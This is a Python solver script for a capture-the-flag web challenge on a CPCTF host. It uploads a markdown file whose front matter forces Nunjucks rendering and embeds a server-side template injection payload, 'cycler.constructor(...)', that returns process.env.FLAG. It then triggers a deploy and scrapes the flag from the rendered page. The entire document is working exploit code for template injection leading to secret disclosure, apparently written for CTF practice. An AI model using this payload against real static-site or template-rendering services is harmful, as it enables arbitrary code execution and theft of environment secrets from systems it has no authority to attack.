#!/usr/bin/env python3

import json
import re
import sys
import urllib.request
from http.cookiejar import CookieJar

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://dpoj3jcn.tar-me.web.cpctf.space"

PAYLOAD = b"""---
permalink: index.html
templateEngineOverride: njk,md
---
{{ cycler.constructor("return process.env.FLAG")() }}
"""


jar = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def request(method, path, data=None, headers=None):
    req = urllib.request.Request(
        BASE + path,
        data=data,
        headers=headers or {},
        method=method,
    )
    with opener.open(req) as resp:
        return resp.status, resp.read().decode()


status, body = request(
    "POST",
    "/api/files",
    data=PAYLOAD,
    headers={
        "Content-Type": "text/markdown",
        "Content-Disposition": 'attachment; filename="index.md"',
    },
)
if status != 200:
    raise SystemExit(f"upload failed: {status} {body}")

status, body = request("POST", "/api/deploy")
if status != 200:
    raise SystemExit(f"deploy failed: {status} {body}")

site_url = json.loads(body)["url"]
status, body = request("GET", site_url)
if status != 200:
    raise SystemExit(f"fetch failed: {status} {body}")

m = re.search(r"CPCTF\{[^}]+\}", body)
print(m.group(0) if m else body)
